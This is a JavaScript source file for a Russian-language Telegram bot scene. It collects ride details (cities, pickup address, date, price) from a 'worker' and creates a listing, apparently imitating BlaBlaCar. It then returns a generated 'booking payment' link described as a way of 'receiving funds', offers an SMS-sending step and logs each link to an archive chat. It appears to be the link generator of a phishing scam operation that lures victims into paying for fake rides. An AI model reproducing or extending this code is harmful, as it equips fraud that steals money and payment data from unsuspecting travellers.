const { Scenes } = require('telegraf')

const bbc = require('../../database/models/bbc')
const linkGen = require('../other/generateLink')
const logs = require('../../database/models/log')

const config = require('../../configs/config.json')

const bbcCreate = new Scenes.WizardScene('bbc1', async (ctx) => {
    try {
        ctx.wizard.state.data = {}
        ctx.wizard.state.data.tgid = ctx.from.id
        ctx.wizard.state.data.service = ctx.callbackQuery.data

        if (ctx.wizard.state.data.service.includes('1.0')) {
            ctx.wizard.state.data.type = "1"
        } else {
            ctx.wizard.state.data.type = "2"  
        }

        await ctx.replyWithHTML('🚙 <b>Введите город отправления</b>\n❕ <b>Пример:</b> <code>Москва</code>', {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '◀️ Отмена', callback_data: 'nazad' }]
                ]
            }
        })

        return ctx.wizard.next()
    } catch (e) {
        await ctx.replyWithHTML(`Неизвестная команда. Вернитесь в меню.`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назаддддд' }]
                ]
            }
        })

        return ctx.scene.leave()
    }
}, async (ctx) => {
    try {
        ctx.wizard.state.data.city_from = ctx.message.text

        await ctx.replyWithHTML('🚙 <b>Введите место отправления</b>\n❕ <b>Пример:</b> <code>Улица Сваровски, д. 10</code>', {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '◀️ Назад', callback_data: 'nazad' }]
                ]
            }
        })

        return ctx.wizard.next()
    } catch (e) {
        await ctx.replyWithHTML(`Неизвестная команда. Вернитесь в меню.`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назаддддд' }]
                ]
            }
        })

        return ctx.scene.leave()
    }
}, async (ctx) => {
    try {
        ctx.wizard.state.data.place_from = ctx.message.text

        await ctx.replyWithHTML('🚙 <b>Введите город прибытия</b>\n❕ <b>Пример:</b> <code>Краснодар</code>', {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '◀️ Назад', callback_data: 'nazad' }]
                ]
            }
        })

        return ctx.wizard.next()
    } catch (e) {
        await ctx.replyWithHTML(`Неизвестная команда. Вернитесь в меню.`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назаддддд' }]
                ]
            }
        })

        return ctx.scene.leave()
    }
}, async (ctx) => {
    try {
        ctx.wizard.state.data.city_to = ctx.message.text

        await ctx.replyWithHTML('🚙 <b>Введите дату отправления</b>\n❕ <b>Пример:</b> <code>1/25/2022</code>', {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '◀️ Назад', callback_data: 'nazad' }]
                ]
            }
        })

        return ctx.wizard.next()
    } catch (e) {
        await ctx.replyWithHTML(`Неизвестная команда. Вернитесь в меню.`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назаддддд' }]
                ]
            }
        })

        return ctx.scene.leave()
    }
}, async (ctx) => {
    try {
        ctx.wizard.state.data.date_from = ctx.message.text

        await ctx.replyWithHTML('🚙 <b>Введите стоимость поездки</b>\n❕ <b>Пример:</b> <code>6980</code>', {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '◀️ Назад', callback_data: 'nazad' }]
                ]
            }
        })

        return ctx.wizard.next()
    } catch (e) {
        await ctx.replyWithHTML(`Неизвестная команда. Вернитесь в меню.`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назаддддд' }]
                ]
            }
        })

        return ctx.scene.leave()
    }
}, async (ctx) => {
    try {
        ctx.wizard.state.data.price = ctx.message.text

        await bbc.insertMany({
            service: ctx.wizard.state.data.service,
            tgID: ctx.from.id,
            tgUsername: ctx.from.username,
            city_from: ctx.wizard.state.data.city_from,
            place_from: ctx.wizard.state.data.place_from,
            city_to: ctx.wizard.state.data.city_to,
            date_from: ctx.wizard.state.data.date_from,
            price: parseInt(ctx.wizard.state.data.price)
        }).then(async (res) => {
            await linkGen(res[0].service, res[0].link, ctx.from.id).then(async (link) => {
                await ctx.replyWithHTML(`✅ <b>Готово! Удачной работы ;)</b>\n\n🔗 <b>Получение средств:</b> ${link}`, {
                    reply_markup: {
                        remove_keyboard: true,
                        inline_keyboard: [
                            [{ text: '🕸 Оплата бронирования 🕸', url: link }],
                            [{ text: '💌 Желаете отправить СМС? 💌', callback_data: `sendSMS ${res[0].link}` }],
                            [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назаддддд' }]
                        ]
                    }
                })
                
                await ctx.telegram.sendMessage(config.bot.archive_chat, `${res[0].service} <b>создание!</b>\n\n<b>Воркер:</b> ${res[0].tgID} <b>|</b> @${res[0].tgUsername}\n<b>Поездка:</b> ${res[0].city_from} -> ${res[0].city_to}\n<b>Прайс:</b> ${res[0].price}\n\n<b>Ссылка:</b> ${link}`, { 
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: 'Удалить', callback_data: `deleteSpamBBC ${res[0].link}` }]
                        ]
                    }
                }).catch(async (e) => {
                    console.log(e)
                })
            })

            await logs.insertMany({ link: res[0].link })
        })

        return ctx.scene.leave()
    } catch (e) {
        await ctx.replyWithHTML(`Неизвестная команда. Вернитесь в меню.`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назаддддд' }]
                ]
            }
        })

        console.log(e)

        return ctx.scene.leave()
    }
})

bbcCreate.action('nazad', async (ctx) => {
    await ctx.deleteMessage(ctx.update.callback_query.message.message_id)
    return await ctx.scene.leave()
})

module.exports = bbcCreate